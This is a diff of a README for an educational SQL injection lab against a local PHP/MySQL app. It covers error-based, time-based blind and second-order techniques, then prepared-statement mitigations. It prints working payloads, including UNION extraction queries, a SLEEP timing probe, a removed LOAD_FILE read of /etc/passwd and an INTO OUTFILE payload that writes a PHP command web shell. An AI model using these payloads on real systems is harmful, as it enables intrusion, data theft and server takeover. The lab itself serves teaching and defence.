@@ -3,57 +3,72 @@ A hands-on lab exploring advanced SQL injection techniques (Error-based, Time-bl
 
 
 📌 Project Overview
-This repository contains a hands-on cybersecurity lab exploring advanced SQL Injection (SQLi) techniques. The project demonstrates how vulnerabilities are exploited in a PHP/MySQL environment and provides secure coding solutions to mitigate these risks.
+This repository documents a hands-on cybersecurity lab focused on advanced SQL Injection (SQLi) techniques. The lab demonstrates how to identify and exploit vulnerabilities within a custom-built PHP/MySQL web application and provides the necessary secure coding mitigations.
 
 🏗️ Lab Environment
-Language: PHP
+OS: Kali Linux
 
-Database: MySQL (vulnerable_db)
+Server Stack: XAMPP for Linux 8.6.30-0 (Apache & MySQL)
 
-Server: XAMPP / LAMP Stack
+Database: vulnerable_db
 
-Platform: Developed and tested on Kali Linux
+Application: PHP-based web application consisting of registration, login, and product search modules.
 
 🚩 Phase 1: Exploitation Walkthrough
 1. Error-Based SQL Injection
-Target: search.php
+File: search.php
 
-Objective: Force the database to leak metadata through the UI.
+Objective: Extract sensitive database metadata via the search interface.
 
-Payloads:
+Payloads Used:
 
-Retrieve Version: ' UNION SELECT NULL, version(), NULL #
+Database Version: ' UNION SELECT NULL, version(), NULL #
 
-Retrieve DB Name: ' UNION SELECT NULL, database(), NULL #
+Result: Extracted version 10.4.32-MariaDB.
 
-List Tables: ' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema = 'vulnerable_db' #
+Database Name: ' UNION SELECT NULL, database(), NULL #
+
+Result: Confirmed name vulnerable_db.
+
+Current User: ' UNION SELECT NULL, user(), NULL #
+
+Result: Confirmed user root@localhost.
 
 2. Time-Based Blind SQL Injection
-Target: login.php
+File: login.php
 
-Objective: Confirm vulnerability by inducing a time delay.
+Objective: Verify vulnerability when no data is returned to the UI by observing server response times.
 
 Payload: admin' AND SLEEP(5) #
 
-Result: The application pauses for 5 seconds before responding, indicating successful injection.
+Result: The application experienced a 5-second delay before responding, confirming the injection point.
 
 3. Second-Order SQL Injection
-Target: register.php (Entry) & login.php (Execution)
+File: register.php
 
-Objective: Inject a payload that is stored in the database and executed during a later session.
+Objective: Inject a malicious payload during registration that is stored and executed by the system at a later stage.
 
 Payload: admin'--
 
-4. Advanced File Operations
-Read System Files: ' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL #
+4. Advanced Exploitation (RCE)
+Objective: Achieve Remote Code Execution by writing a web shell to the server using the INTO OUTFILE command.
 
-RCE (Web Shell): ' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/opt/lampp/htdocs/shell.php' #
+Payload: ' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/opt/lampp/htdocs/vulnerable_app/shell.php' #
 
-🛡️ Phase 2: Mitigation & Secure Coding
-The primary defense against SQL Injection is the use of Prepared Statements (Parameterized Queries).
+🛡️ Phase 2: Mitigation Strategies
+The most effective defense against these attacks is replacing dynamic SQL queries with Prepared Statements.
 
-Vulnerable Code Example
-Secure Code Example (The Fix)
+Vulnerable Code Example:
+
+PHP
+$sql = "SELECT * FROM users WHERE username = '$username'"; 
+Secure Mitigation (PHP MySQLi):
+
+PHP
+$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->bind_param("s", $username);
+$stmt->execute();
+$result = $stmt->get_result();
 
 ⚖️ Ethical Disclaimer
-This lab is for educational and ethical hacking purposes only. All testing was performed in a controlled local environment.
+This project was performed in a controlled, local environment for educational purposes. Unauthorized testing against external systems is illegal and unethical.
